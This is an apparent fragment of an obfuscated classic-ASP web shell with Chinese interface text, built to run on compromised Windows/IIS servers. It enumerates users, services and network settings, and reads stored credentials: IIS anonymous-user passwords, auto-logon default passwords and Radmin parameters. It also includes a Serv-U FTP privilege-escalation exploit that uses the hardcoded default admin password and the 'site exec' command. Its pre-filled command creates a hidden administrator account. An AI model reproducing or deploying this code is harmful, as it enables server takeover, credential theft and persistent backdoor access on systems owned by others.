Function ymv(scm)
Dim daw
On Error Resume Next
Set daw=jgb.OpenSchema(28,Array(Empty,Empty,scm))
If Not daw.Eof Then ymv=daw("COLUMN_NAME")
Set daw=Nothing
End Function
Function tnr(flag)
Dim str
Select Case flag
Case 0 : str="EMPTY"
Case 2 : str="SMALLINT"
Case 3 : str="INTEGER"
Case 4 : str="SINGLE"
Case 5 : str="DOUBLE"
Case 6 : str="CURRENCY"
Case 7 : str="DATE"
Case 8 : str="BSTR"
Case 9 : str="IDISPATCH"
Case 10 : str="ERROR"
Case 11 : str="BIT"
Case 12 : str="VARIANT"
Case 13 : str="IUNKNOWN"
Case 14 : str="DECIMAL"
Case 16 : str="TINYINT"
Case 17 : str="UNSIGNEDTINYINT"
Case 18 : str="UNSIGNEDSMALLINT"
Case 19 : str="UNSIGNEDINT"
Case 20 : str="BIGINT"
Case 21 : str="UNSIGNEDBIGINT"
Case 72 : str="GUID"
Case 128 : str="BINARY"
Case 129 : str="mqt"
Case 130 : str="WCHAR"
Case 131 : str="NUMERIC"
Case 132 : str="USERDEFINED"
Case 133 : str="DBDATE"
Case 134 : str="DBTIME"
Case 135 : str="DBTIMESTAMP"
Case 136 : str="CHAPTER"
Case 200 : str="VARCHAR"
Case 201 : str="LONGVARCHAR"
Case 202 : str="VARWCHAR"
Case 203 : str="LONGVARWCHAR"
Case 204 : str="VARBINARY"
Case 205 : str="LONGVARBINARY"
Case Else : str=flag
End Select
tnr=str
End Function
Sub yey(str)
If str="" Then
j"<script language=javascript>window.close();</script>"
 Else
j"<script language=javascript>alert(""" & str & """);window.close();</script>"
End If
End Sub
Function emb(str)
str=aqw(str)
str=Replace(str," ","&nbsp;")
str=Replace(str,"","&nbsp;&nbsp;&nbsp;&nbsp;")
str=Replace(str,vbNewLine,"<br />")
emb=str
End Function
Function fop(rpath)
Dim zfb,lpd
On Error Resume Next
ays
zfb=ffe.RegRead(rpath)
If IsArray(zfb)Then
lpd=""
For i=0 To UBound(zfb)
If IsNumeric(zfb(i))Then
If CInt(zfb(i))<16 Then
lpd=lpd&"0"
End If
lpd=lpd&CStr(Hex(CInt(zfb(i))))
Else
lpd=lpd&zfb(i)
End If
Next
fop=lpd
Else
fop=zfb
End If
if err then fop=dwe(err.Description)
End Function
Sub nsp(ygt,i)
Dim efp,ytx,ley
On Error Resume Next
Set efp=getObject("WinNT://./"&ygt&",user")
ytx=efp.Get("UserFlags")
ley=efp.LastLogin
ujq 200,"<b>"&efp.Name&"</b>":ujq 50,"隶属于：":ujq"",azp(ygt):ujq 60,"最后登录：":ujq 140,ley
ity
ycf"100%"" id=""usertr_"&i&""" style=""display:none;"
cqb 0
ujq 150,"密码已过期"
ujq"",CBool(efp.Get("PasswordEx"&rbw&"pired"))
ihv 1
ujq"","密码永不过期"
ujq"",cbool(ytx And&H10000)
ihv 0
ujq"","用户不能更改密码"
ujq"",cbool(ytx And&H00040)
ihv 1
ujq"","全局账户"
ujq"",cbool(ytx And&H100)
ihv 0
ujq"","密码最小长度"
ujq"",efp.PasswordMinimumLength
ihv 1
ujq"","是否必须密码"
ujq"",efp.PasswordRequired
ihv 0
ujq"","账户已停用"
ujq"",efp.AccountDisabled
ihv 1
ujq"","账户已锁定"
ujq"",efp.IsAccountLocked
ihv 0
ujq"","用户配置文件"
ujq"",efp.Profile
ihv 1
ujq"","用户登录脚本"
ujq"",efp.LoginScript
ihv 0
ujq"","用户主文件夹"
ujq"",efp.HomeDirectory
ihv 1
ujq"","用户主驱动器"
ujq"",efp.Get("HomeDirDr"&lqo&"ive")
ihv 0
ujq"","描述："
ujq"",efp.Description
If Err Then Err.Clear
End Sub
Sub bin()
Dim wqg,ktt,wbm
Set wbm=getObject("WinNT://.")
wbm.Filter=Array("User")
ngn"User"
i=0
For Each wqg in wbm
i=i+1
ycf"100%"" style=""cursor:pointer;"" onclick=""javascript:flt('usertr_"&i&"')"
cqo
ujq 10,"<div style='width:10px;height:10px;' id='ss_"&i&"'>"&yez(qpe("3"))&"</div>"
nsp wqg.Name,i
ity
Next
ixt(Err)
ngn"UserGroup"
wbm.Filter=Array("Group")
vux
i=0
For Each ktt in wbm
ihv(i mod 2)
ujq"",ktt.Name
ujq"",ktt.Description
i=i+1
Next
ity
j"</span>"
ixt(Err)
End Sub
Function azp(ygt)
Dim wqg,ktt,elp
Set wqg=getObject("WinNT://./"&ygt&",user")
For Each ktt in wqg.Groups
elp=elp+1
if elp>1 then azp=azp&" , "
azp=azp&" "&ktt.Name
Next
End Function
sub rul()
ngn"系统进程"
vux
cqo
ujq 100,"<B>进程名</B>"
ujq 100,"<B>描述</B>"
ujq 60,"<B>启动类型</B>"
ujq"","<B>位置</B>"
on error resume next
dim adv,ujb,ksu
i=1
    for each obj in getObject("WinNT://.")
if  trim(OBJ.StartType)="" then
else
i=i+1
if OBJ.StartType=2 then adv="自动"
if OBJ.StartType=3 then adv="手动"
if OBJ.StartType=4 then adv="禁用"
ihv(i mod 2)
ujq"e",obj.Name
ujq"w",obj.DisplayName
ujq"p",adv
ujq"",obj.path
end if
next
ity
err.clear
end sub
Sub kas()
dim twb,ozu,i,kyk,kgf,sww,bmg,xur,rqi,cof
On Error Resume Next
Set kgf=GetObject("IIS://LocalHost/W3SVC")
If err Then Exit sub
vux
cqb 2
ujq"",b("ID")
ujq"",b("Name")
ujq"",b("User")
ujq"",b("Pass")
ujq 130,b("Ip&Port")
ujq"",b("Domain")
ujq"",b("Path")
i=0
For Each kyk In kgf
m=i mod 2
ozu=replace(kyk.AdsPath,Left(kyk.Adspath,22),"")
if IsNumeric(ozu)=true then
ihv m
i=i+1
set IIs=kgf.GetObject("IIsWebServer",ozu)
if err Then
ujq"'% colspan='7",Err.Description
else
set sww=iis.getobject("IIsWebVirtualDir","Root")
bmg=IIS.serverBindings
rqi="":cof=""
for n=0 to ubound(bmg)
xur=split(bmg(n),":")
rqi=rqi&iif(xur(0)<>"",xur(0),"默认IP")&":"&xur(1)&"<br>"
cof=cof&xur(2)&"<br>"
next
ujq"",i
ujq"",iis.servercomment
ujq"",sww.AnonymousUserName
ujq"",sww.AnonymousUserPass
ujq"",rqi
ujq"",cof
ujq"",sww.path
End If
end if
Next
ctn=ctn&"</table>"
j ctn
Set kgf=Nothing
End Sub
sub mpt()
On Error Resume Next
dim zui,qni,qsz,tyh,uaj,pns,nub,nrt,lkz,qai,pkn,rfc,jww,bck,vxr,rsd,vox,udo,zvh,wls
if mpi=false then
j fxu(1)&"组件不存在，无法进行相关检测！"
exit sub
end if
ays
ngn"[网络"&"探测]"
zko
zui="HK"&jtb&"LM\SYSTEM\CurrentCo"&nhz&"ntrolSet\Services\Tcpip\Parameters\EnableSecur"&ofg&"ityFilters"
qni=ffe.Regread(zui)
If qni=0 or qni="" Then
qsz=1
End If 
tyh="HK"&jtb&"LM\SYSTEM\ControlS"&fpa&"et001\Services\Tcpip\Linkage\Bind"
uaj=ffe.RegRead(tyh)
hk="HK"&jtb&"LM\SYSTEM\ControlS"&fpa&"et001\Services\Tcpip\Enum\Count"
kk=ffe.RegRead(hk)
vux
cfx="活动网卡ip："
If IsArray(uaj) Then 
For i=LBound(uaj) To UBound(uaj)-1
pns=Replace(uaj(i),"\Device\","")
ihv 0
j"<td>"
j"网卡"&i&"的序列为:"&pns
j"<br>"
nub="HKEY_LOCAL_MACHINE\SYSTEM\ControlS"&fpa&"et001\Services\Tcpip\Parameters\Interfaces\"
nrt=nub&pns&"\IPAddress"
lkz=ffe.Regread(nrt)
If lkz(0)<>"" Then
For x=Lbound(lkz) to Ubound(lkz)
j"<li>IP地"&"址"&x&"为:"&lkz(x)
if i=kk then j dwe(" 当前活动网卡"):cfx=cfx&dwe(lkz(x))&"，"
Next
Else
j"<li>IP地"&"址无法读取"&"或没有设置<br>"
End if
qai=nub&pns&"\De"&poe&"faultGateway"
pkn=ffe.Regread(qai)
If isarray(pkn) Then
For x=Lbound(pkn) to Ubound(pkn)
j"<li>网关"&x&":"&pkn(x)&"<br>"
Next
Else
j"<li>网关无法读取或没有设置<br>"
End if
rfc=nub&pns&"\NameSe"&jqx&"rver"
jww=ffe.RegRead(rfc)
If jww<>"" Then
j"<li>网卡"&"DNS为:"&jww&"<br>"
Else
j"<li>默认"&"DNS无法读取或没有设置<br>"
End If
if qsz=1 Then 
j"<li>没Tcp/IP筛选<br>"
else
bck="\TCPAllowedPorts"
vxr="\UDPAllowedPorts"
rsd=nub&pns&bck
vox=nub&pns&vxr
udo=ffe.RegRead(rsd)
If udo(0)="" or udo(0)=0 Then
j"<li>允许"&"的tcp端口为:全部<br>"
Else
j"<li>允许"&"的tcp端口为:"
For j=LBound(udo) To UBound(udo)
j udo(j)&","
Next
j"<Br>"
End if
zvh=ffe.RegRead(vox)
If zvh(0)="" or zvh(0)=0 Then
j"<li>允许"&"的udp端口为:全部<br>"
Else
j"<li>允许"&"的udp端口为:"
for j=LBound(zvh) To UBound(zvh)
j zvh(j)&","
next
j"<br>"
End if
End if
j"</td>"
Next
err.clear
end if
ity
end sub
function azz()
ngn"[管"&"理"&"员"&"用"&"户]"
zko
on error resume next 
vux
Set tN=khe("WScri"&jjx&"pt.Network")
Set ktt=GetObject("WinNT://"&tN.ComputerName&"/Administrators,group")
For Each a in ktt.Members
ihv 1:ujq"80","账号名：":ujq"",a.Name
Next
if err then
j Err.Description
end if
ity
end function
sub zhu()
dim zig
ayd"Application 变量列表"
vux
cqo
ujq 110,"<b>变 量 名 称</b>"
ujq"","<b>值</b>"
i=1
for each a in Application.Contents
i=i+1
ihv(i mod 2)
ujq"",a
if isobject(Application.Contents(a)) then
zig="[对象]"
elseif isarray(Application.Contents(a)) then
zig="[数组]"
else
zig=dfl(Application.Contents(a))
end if
ujq"",zig
next
ity
end sub
sub bva()
dim beg
ayd"Session 变量列表"
vux
cqo
ujq 110,"<b>变 量 名 称</b>"
ujq"","<b>值</b>"
i=1
for each a in Session.Contents
i=i+1
ihv(i mod 2)
ujq"d",a
if isobject(Session.Contents(a)) then
beg="[对象]"
elseif isarray(Session.Contents(a)) then
beg="[数组]"
else
beg=dfl(Session.Contents(a))
end if
ujq"",beg
next
ity
end sub
sub yqq()
ayd"Req"&"ue"&"st.S"&"erv"&"erVa"&"ria"&"bles 变量列表(含客户端信息)"
vux
cqo
ujq 110,"<b>变 量 名 称</b>"
ujq"","<b>值</b>"
i=1
for each a in Request.ServerVariables
i=i+1
ihv(i mod 2)
ujq"e",a
ujq"",dfl(oxs(a))
next
ity
end sub
sub pau()
On Error Resume Next
ays
ayd fxu(1)&".Environments 变量列表"
vux
cqo
ujq 110,"<b>变 量 名 称</b>"
ujq"","<b>值</b>"
i=1
for each a in ffe.Environment
i=i+1
iyc=split(a,"=")
ihv(i mod 2)
ujq"w",iyc(0)
ujq"",dfl(iyc(1))
next
ity
end sub
sub mws()
On Error Resume Next
ays
Set fwv=ffe.Environment("SYSTEM")
riw=cstr(fwv("OS"))
lbc=cstr(fwv("NUM"&nlg&"BER_OF_PROCESSORS"))
gwm=cstr(fwv("PROC"&dgi&"ESSOR_IDENTIfIER"))
if isempty(lbc) then
lbc=oxs("NUM"&nlg&"BER_OF_PROCESSORS")
end if
if lbc="" then
lbc="(未知)"
end if
if riw="" then
riw="(未知)"
end if
end sub
sub ufw()
dim qwp,mnl,qbi,ukl,jzp,qvt,zoi,dui,i
On Error Resume Next
if mpi=false then exit sub
ays
mrn"系统当前"&"路"&"径变量",6,1
zoi=ffe.Environment.item("Path")
vux
dui=split(zoi,";")
ihv 0
For each x in dui
if x<>"" then
if i mod 2=0 then ihv 0
ujq"50%","<li>"&iif(instr(x,":\")>0,afo(x,b(x)),x)
i=i+1
end if
next
if i mod 2=1 then ujq"","&nbsp;"
ity
ity
end sub
sub krt()
On Error Resume Next
mrn"服务器基本信息",3,1
vux
cqb 0
ujq 110,"服务器地址"
ujq"","名称 "&oxs("SERVER_NAME")&" (IP:"&jmc&") 端口:"&oxs("SERVER_PORT")
pis=now():ybv=cstr(pis)
if ybv <> year(pis) & "-" & month(pis) & "-" & day(pis) & " " & hour(pis) & ":" & right(FormatNumber(minute(pis)/100,2),2) & ":" & right(FormatNumber(second(pis)/100,2),2) then ybv=ybv & " (日期格式不规范)"
ujq"","服务器时间"
ujq"",ybv
ihv 0
mws
ujq"","服务器操作系统"
riw=riw&usx("mpt","",b(" [端口&网络]"))
jua=usx("kas","",b(" [IIS信息]"))
nan=usx("vov","",b(" [脚本探测]"))
ujq"",riw
ujq"","IIS版本"
ujq"",oxs("SERVER_SOFTWARE")&jua
ihv 0
ujq"","脚本超时时间"
ujq"",Server.ScriptTimeout
ujq"","服务器脚本引擎"
ujq"",ScriptEngine & "/"& ScriptEngineMajorVersion &"."&ScriptEngineMinorVersion&"."& ScriptEngineBuildVersion&nan
ihv 0
ujq"","本文件路径"
ujq"",oxs("PATH_TRANSLATED")
ujq"","ServerVariables"
ujq"",Request.ServerVariables.Count&" 个"&yce
ihv 0
ujq"","服务器CPU通道数"
ujq"",lbc&" 个"
ujq"","全局和会话变量"
if Application.Contents.count>0 then amt=" "&usx("zhu","",b(" [列表]"))
if Session.Contents.count>0 then xkj=" "&usx("bva","",b(" [列表]"))
if Request.ServerVariables.Count>0 then yce=" ["&usx("yqq","","Requ"&"est.Ser"&"verVa"&"riables 列表")&"] "
ujq"","Application 变量 "&Application.Contents.count&" 个"&amt&", Session 变量 "&Session.Contents.count&" 个"&xkj&"&nbsp;当前会话ID: "&Session.SessionId()
ihv 0
ays
dim sbb
sbb="读取失败(组件不可用)"
ujq"","服务器CPU详情"
ujq"",gwm
ujq"","全部服务器环境"
if ffe.Environment.count>0 then nmc=" "&usx("pau","",b("[W"&"Ss"&"h"&"ell.Environment 列表]"))
ujq"",ffe.Environment.count&" 个"&nmc
ihv 0
ycq="HK"&jtb&"LM\SYSTEM\CurrentCo"&nhz&"ntrolSet\Control\ComputerName\ComputerName\ComputerName"
sao=ffe.RegRead(ycq)
if sao="" Then sao="无法读取主机名."
ujq"","主机名"
ujq"",sao
qbi="HKEY_LOCAL_MACHINE\SYSTEM\CurrentCo"&nhz&"ntrolSet\Control\Te"&weu&"rminal Server\Wds\rdpwd\Tds\tcp\PortNumber"
ukl=ffe.RegRead(qbi)
If ukl="" Then ukl="无法"&"读取."
ujq"","Te"&weu&"rminal Service端口"
ujq"",ukl
ihv 0
nnp="HKEY_LOCAL_MACHINE\SOF"&jjl&"TWARE\Microsoft\Windows"&vgn&" NT\Curren"&gic&"tVersion\Winlo"&kcc&"gon\AltDefaultUserName"
wik=ffe.RegRead(nnp)
if wik="" Then wik="Administrator"
on error resume next 
jom=ffe.regRead("HKEY_LOCAL_MACHINE\SOF"&jjl&"TWARE\Microsoft\Windows\Curren"&gic&"tVersion\Policies\System\DontDisplayLastUserName")
If jom="" or jom=0 Then eee=" ＝ " else eee=" ≠ "
ujq"","默"&"认管"&"理"&"员"
mra=IIf(mpi,wik&eee&"上次"&"登"&"录用"&"户",sbb)
mra=mra&"&nbsp;"&usx("azz","",b(" [详情]"))
ujq"",mra
oia="HKEY_LOCAL_MACHINE\SOF"&jjl&"TWARE\Microsoft\Windows"&vgn&" NT\Curren"&gic&"tVersion\Winlo"&kcc&"gon\AutoAdminLo"&lml&"gon"
olv=ffe.RegRead(oia)
ujq"","用户自动登入"
if olv=0 or olv="" Then
ujq"","未启用"
Else
ujq"","启用"
tkz=ffe.RegRead("HKEY_LOCAL_MACHINE\SOF"&jjl&"TWARE\Microsoft\Windows"&vgn&" NT\Curren"&gic&"tVersion\Winlo"&kcc&"gon\De"&kns&"faultUserName")
fgq=ffe.RegRead("HKEY_LOCAL_MACHINE\SOF"&jjl&"TWARE\Microsoft\Windows"&vgn&" NT\Curren"&gic&"tVersion\Winlo"&kcc&"gon\DefaultPass"&wlf&"word")
j dwe("(用户名:"&tkz&" ，密码:"&fgq&")")
End if
ity
err.clear:zko
end sub
function cav(ama)
On Error Resume Next
cav=false
set lut=khe(ama)
If -2147221005 <> Err then cav=true
set lut=nothing
err.clear
End function
function dfl(vpu)
  dfl=vpu
  dfl=aqw(dfl)
  dfl=replace(dfl,chr(10),"<br>")
end function
sub logout()
session.Abandon()
qnk"n",qzx,"_parent":sdj:tng"n.submit()"
end sub
sub p()
j"<br>"
end sub
function qjr(xpb,nlf)
qjr="<div name='"&xpb&"' id='"&xpb&"' style='display:none;'>"&nlf&"</div>"
end function
function mrn(t,n,d)
dim mno
if d=0 then
d="none"
mno=yez(qpe("3"))
else
d=""
mno=dwe(qpe("4"))
end if
vux
cqb 1
ujq"10' % id='ss_"&n&"",mno
ujq"","<b style='color:"&cl(13)&"'>"&t&"</b><span id='y"&n&"'></span>"
ity
ycf"100%"" id='w_"&n&"' style=""display:"&d&";":cqb 0:j"<td>"
end function
lkp
sub lkp()
xuf
if sgb<>"" then
session("sgb")=sgb
end if
if session("sgb")="" then
sgb=oeh
session("sgb")=sgb
end if
if session("sgb")<>"" and right(session("sgb"),1)<>"\" then session("sgb")=session("sgb")&"\"
if oxs("QUERY_STRING")=vgo then session(vgo)=vgo
If ywc And Trim(oxs("AUTH_U"&pue&"SER"))="" Then
Response.Status="401 Unauth"&tus&"orized"
Response.Addheader"WWW-AuTh"&tvn&"enticate","BASIC"
If oxs("AUTH_U"&pue&"SER")=""Then Response.End()
End If
session(vgo)=vgo
if session(vgo)<>vgo then son
j bvn
tng"function flt(obj){var sender=event.srcElement;var myhand='ss_'+obj.split('_')[1];if(document.getElementById(obj).style.display=='none'){document.getElementById(obj).style.display='';document.getElementById(myhand).innerHTML='"&dwe(qpe("4"))&"';sender.className='showhref';}else{document.getElementById(obj).style.display='none';document.getElementById(myhand).innerHTML='"&yez(qpe("3"))&"';sender.className='hidehref';}}"
select case oej
case "iih":iih()
case "zhu":zhu
case "bva":bva
case "yqq":yqq
case "pau":pau
case "bin":bin:rul
case "kas":kas
case "rul":rul
case "ndk":ndk
case "azz":azz
case "kud":kud
case "ihm":ihm
case "fva":fva
case "yoq":yoq
case "iij"
set abc=new llbf:abc.iij():set abc=nothing
case "vov"
set abc=new llbf:abc.llb():set abc=nothing
case "ttf"
set abc=new llbf:abc.ttf():set abc=nothing
case "aam"
set abc=new llbf:abc.aam(""):set abc=nothing
case "jeh"
set abc=new llbf:abc.jeh:set abc=nothing
case "jqw"
set abc=new llbf:abc.jqw:set abc=nothing
case "mvi"
set abc=new llbf:abc.mvi():set abc=nothing
case "psx"
set abc=new llbf:abc.psx():set abc=nothing
case"xzh":xzh
case"awi"
set abc=new llbf:abc.awi(session("sgb")):set abc=nothing
case "zoj"
set abc=new llbf:abc.zoj(session("sgb")):set abc=nothing
case "krt":krt
case "logout":logout
case "wlr"
set abc=new llbf:abc.wlr(wnb):set abc=nothing
case "feh"
set abc=new llbf:abc.feh():set abc=nothing
case "yzx"
set abc=new llbf:abc.yzx(wnb):set abc=nothing
case "evu"
set abc=new llbf:abc.evu(wnb):set abc=nothing
case "zbw"
set abc=new llbf:abc.zbw wnb,wqw:set abc=nothing
case "kuq"
set abc=new llbf:abc.zbw wnb,1:set abc=nothing
case "ezp"
set abc=new llbf:abc.zbw wnb,2:set abc=nothing
case "lzj"
set abc=new llbf:abc.zbw wnb,3:set abc=nothing
case "qqd"
set abc=new llbf:abc.zbw wnb,4:set abc=nothing
case "oio"
set abc=new llbf:abc.oio(wnb):set abc=nothing
case "czg"
set abc=new llbf:abc.czg(wnb):set abc=nothing
case "mpt":mpt
case "vfc"
set abc=new llbf:abc.vfc():set abc=nothing
case "ydr"
set abc=new llbf:abc.ydr(wnb):set abc=nothing
case else
bcy
end select
end sub
Function jkj()
On Error Resume Next
dim ama,mis,bhd,ulm
ays
mis=ffe.REGREAD("HKEY_LOCAL_MACHINE\SYSTEM\Radm"&iiw&"in\v2.0\Server\Parameters\Parameter")
if err then err.clear:exit function
If IsArray(mis) Then
For i=0 To UBound(mis)
If  Len (hex(mis(i)))=1 Then 
ama=ama & "0" & CStr(Hex(mis(i)))
Else
ama=ama & Hex(mis(i))
End If 
Next
Else
ama="Error! Can't Read!"
End If
ama=dwe("Parameter:")&ama
bhd=ffe.REGREAD("HKEY_LOCAL_MACHINE\SYSTEM\Radm"&iiw&"in\v2.0\Server\Parameters\Port")
If IsArray(bhd) Then 
ulm=Clng("&H"&CStr(Hex(bhd(1)))&CStr(Hex(bhd(0))))
Else 
ulm="Error! Can't Read!"
End If
ulm=dwe("Port:")&ulm
mrn"R"&"a"&"dm"&"in"&"&nbsp;&nbsp;&nbsp;&nbsp;"&ama&"&nbsp;&nbsp;"&ulm,5,1
End Function
Sub yoq()
On Error Resume Next
Dim rbl
rbl="Myftp"
rnz="User "&rxe&vbCrLf
pdl="Pass "&zgx&vbCrLf
rbz="-DELETED"&koc&"OMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&yxn&vbCrLf
mt="SITE MAINT"&ivu&"ENANCE"&vbCrLf
svx="-SetD"&wru&"OMAIN"&vbCrLf&"-Domain="&rbl&"|0.0.0.0|"&yxn&"|-1|1|0"&vbCrLf&"-TZOE"&dxc&"nable=0"&vbCrLf&" TZOKey="&vbCrLf
ipi="-SetUS"&tjm&"ERSetUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&yxn&vbCrLf&"-User="&vfo&vbCrLf&"-Password="&nbb&vbCrLf&_
"-HomeDir="&thr()&"\\"&vbCrLf&"-Login"&mla&"MesFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPat"&ckn&"hs=1"&vbCrLf&_
"-NeedSe"&ghs&"cure=0"&vbCrLf&"-Hide"&jsp&"Hidden=0"&vbCrLf&"-AlwaysAl"&jpl&"lowLogin=0"&vbCrLf&"-ChangePasswo"&odk&"rd=0"&vbCrLf&_
"-QuotaEn"&vto&"able=0"&vbCrLf&"-MaxU"&jsq&"sersLoginPerIP=-1"&vbCrLf&"-Spee"&bwx&"dLimitUp=0"&vbCrLf&"-SpeedLimitDo"&als&"wn=0"&vbCrLf&_
"-MaxNrUse"&pqp&"rs=-1"&vbCrLf&"-IdleTim"&uxc&"eOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-MAINT"&ivu&"ENANCE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&thr()&"\\|RWAMELC"&wfe&"DP"&vbCrLf
qgl="QUIT"&vbCrLf
ngn("Serv"&mro&"-U FTP Exp")
Select Case wnb
Case "11"
nmp
Case "22"
sqy
Case "33"
mhx
Case "44"
yyl
Case "55"
lnv
Case Else
If IsObject(Session("aaa"))Then Session("aaa").abort
If IsObject(Session("bbb"))Then Session("bbb").abort
If IsObject(Session("ccc"))Then Session("ccc").abort
set Session("aaa")=nothing
set Session("aaa")=nothing
set Session("aaa")=nothing
qnk"zol","",""
njk"oej","","yoq"
njk"wnb","",11
j"<center><b>Add Temp Domain</b><br>"
ycf "80%"
j"<hr>"
cqb 1
ujq 80,"Local user"
ujq"",fri("rxe","text","LocalA"&qkp&"dministrator")
ujq"80m","Local pass"
ujq"",fri("zgx","text","#l@$ak#.lk;0@P")
ihv 1
ujq"m"," Local port"
ujq"",fri("snq","text","43"&yen&"958")
ujq"10%","Sys drive"
ujq"40%",fri("suPath","text",thr())
ihv 1
ujq"","New user"
ujq"",fri("vfo","text","go")
ujq"","New pass"
ujq"",fri("nbb","text","od")
ihv 1
ujq"","New port"
ujq"",fri("yxn","text","60000")
ujq""," "
ujq"",fri("","submit","Go")&" "&fri("","reSet","ReSet")
ity
j"</center>"
sdj
End Select
j"<center>"
ycf"80%"
j"<hr>"
cqb 0
ujq"c",usx("yoq","","Add domain")
ujq"c",usx("yoq",44,"Exec cmd")
ujq"c",usx("yoq",55,"Clean domain")
ity
j"</center>"
j lxr
End Sub
Sub nmp()
On Error Resume Next
Set aaa=khe(fxu(8))
aaa.open"GET","http://127.0.0.1:"&snq&"/goldsun/upa"&stb&"dmin/s1",True,"",""
aaa.send rnz&pdl&mt&rbz&svx&ipi&qgl
j "http://127.0.0.1:"&snq&"/goldsun/upa"&stb&"dmin/s1"
j "<br>"&rnz&"<br>"&pdl&"<br>"&mt&"<br>"&rbz&"<br>"&svx&"<br>"&ipi&"<br>"&qgl
Set Session("aaa")=aaa
tcm"Connecting 127.0.0.1:"&snq&" using "&rxe&",pass:"&zgx&"..."
yyl
End Sub
Sub sqy()
On Error Resume Next
yyl()
Set bbb=khe(fxu(8))
bbb.open"GET","http://"&jmc&":"&yxn&"/goldsun/upa"&stb&"dmin/s2",False,"",""
bbb.send"User "&vfo&vbCrLf&"pass "&nbb&vbCrLf&"site exec "&ajv&vbCrLf&qgl
Set Session("bbb")=bbb
tcm"Executing comma"&rna&"nd..."
j"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
j Replace(bbb.ResponseText,chr(10),"<br>")&"</div></center>"
End Sub
Sub mhx()
On Error Resume Next
Set ccc=khe(fxu(8))
ccc.open "GET","http://127.0.0.1:"&snq&"/goldsun/upa"&stb&"dmin/s3",True,"",""
ccc.send rnz&pdl&mt&rbz&qgl
Set Session("ccc")=ccc
tcm"Temp domain deleted!"
End Sub
Function thr()
On Error Resume Next
dih
thr=Lcase(Left(ozf.GetSpecialFolder(0),2))
set ozf=nothing
If thr=""Then thr="c:"
End Function
Sub yyl()
If vfo=""Then vfo="go"
If nbb=""Then nbb="od"
If yxn=""Then yxn="60000"
j"<center><b>Execute Cmd</b><br>"
ycf "80%"
j"<hr>"
cqb 1
ujq"80m","comma"&rna&"nd"
ujq"'% colspan='3",fri("ajv1","text","cmd /c net us"&skj&"er yourname$ 0ooo /add & net localg"&pgh&"roup administrators yourname$ /add")
qnk"zol","",""
njk"oej","","yoq"
njk"wnb","",22
njk"ajv","",""
ihv 1
ujq"m","Ftp user"
ujq"40%",fri("vfo","text",vfo)
ujq"10%","Ftp pass"
ujq"40%",fri("nbb","text",nbb)
ihv 1
ujq"","Ftp port"
ujq"",fri("yxn","text",yxn)
ujq""," "
ujq"",fri("^:wkw('zol')","button","Go")&" "&fri("","reSet","ReSet")
ity
j"</center>"
sdj
End Sub
Sub lnv()
qnk"zol","",""
njk"oej","","yoq"
njk"wnb","",33
j"<center><b>Clean Temp Domain</b><br>"
ycf"80%"
j"<hr>"
cqb 1
ujq"20%","Local user"
ujq"",fri("rxe","text","LocalA"&qkp&"dministrator")
ujq"20%","Local pass"
ujq"",fri("zgx","text","#l@$ak#.lk;0@P")
ihv 1
ujq"","Local port"
ujq"",fri("snq","text","43"&yen&"958")
ujq"","Temp domain port"
ujq"",fri("yxn","text","60000")
ihv 1
ujq"'% align='center' colspan='4",fri("","submit","Go")&" "&fri("","reSet","ReSet")
ity
j"</center>"
sdj
End Sub
function mpi()
mpi=iif(cav(fxu(1)) or cav(fxu(2)),true,false)
end function
j pdq(qq)

%>